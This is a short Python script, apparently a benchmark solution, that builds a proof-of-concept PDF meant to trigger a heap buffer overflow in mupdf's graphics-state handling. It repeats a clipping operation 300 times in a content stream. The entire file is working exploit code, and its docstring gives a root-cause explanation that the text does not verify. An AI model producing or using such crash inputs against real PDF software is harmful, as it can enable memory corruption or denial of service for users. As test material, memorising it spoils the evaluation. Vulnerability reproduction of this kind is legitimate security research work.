import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a heap buffer overflow
        in mupdf (oss-fuzz:42537171).

        The vulnerability exists in the 'fitz' core library of mupdf.
        The function `fz_new_gstate` uses a fixed-size stack for graphics
        states with a capacity of `FZ_MAX_SAVE_NESTING` (256). The vulnerable
        version of the code failed to check if the stack was full before
        incrementing the depth counter and writing to the stack array, leading
        to a heap buffer overflow.

        This vulnerability is triggered by operations that save a new graphics
        state. The PDF clipping path operator `W` (and `W*`) provides such a
        path, eventually calling the vulnerable `fz_new_gstate` function.
        In contrast, the more common `q` (gsave) operator is handled by a
        higher-level, dynamically-sized stack within the PDF parsing layer,
        which prevents a simple overflow.

        The PoC constructs a minimal PDF file with a content stream that
        repeatedly executes a clipping operation. Each `W` operation requires a
        path to be defined, so we precede it with a minimal path definition
        (`0 0 m 0 0 l h`). The `n` operator then ends the path. By repeating
        this sequence more than 256 times (e.g., 300), we overflow the
        fixed-size gstate stack and trigger the crash.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC PDF file that triggers the vulnerability.
        """
        
        # FZ_MAX_SAVE_NESTING is 256. We need > 256 clipping operations.
        # We use 300 for a safety margin.
        num_repetitions = 300
        
        # The payload unit: Define a minimal path, set it as the clip path, and end the path.
        payload_unit = b"0 0 m 0 0 l h W n\n"
        content_stream = payload_unit * num_repetitions
        
        # Build the PDF by accumulating parts.
        pdf_parts = []
        obj_offsets = []

        # Part 1: PDF Header
        pdf_parts.append(b"%PDF-1.7\n")
        
        # Part 2: PDF Objects
        # Object 1: Document Catalog
        obj_offsets.append(len(b"".join(pdf_parts)))
        pdf_parts.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        
        # Object 2: Page Tree
        obj_offsets.append(len(b"".join(pdf_parts)))
        pdf_parts.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        
        # Object 3: Page Object
        obj_offsets.append(len(b"".join(pdf_parts)))
        pdf_parts.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>\nendobj\n")
        
        # Object 4: Content Stream with the malicious payload
        obj_offsets.append(len(b"".join(pdf_parts)))
        stream_header = b"<< /Length %d >>\nstream\n" % len(content_stream)
        stream_footer = b"\nendstream"
        pdf_parts.append(b"4 0 obj\n" + stream_header + content_stream + stream_footer + b"\nendobj\n")
        
        # Part 3: Cross-reference (xref) Table
        xref_offset = len(b"".join(pdf_parts))
        
        xref_parts = [b"xref\n0 5\n"]
        xref_parts.append(b"0000000000 65535 f \n")

        for offset in obj_offsets:
            xref_parts.append(b"%010d 00000 n \n" % offset)
        
        pdf_parts.append(b"".join(xref_parts))
        
        # Part 4: Trailer
        trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
        trailer += b"startxref\n%d\n%%%%EOF\n" % xref_offset
        pdf_parts.append(trailer)
        
        return b"".join(pdf_parts)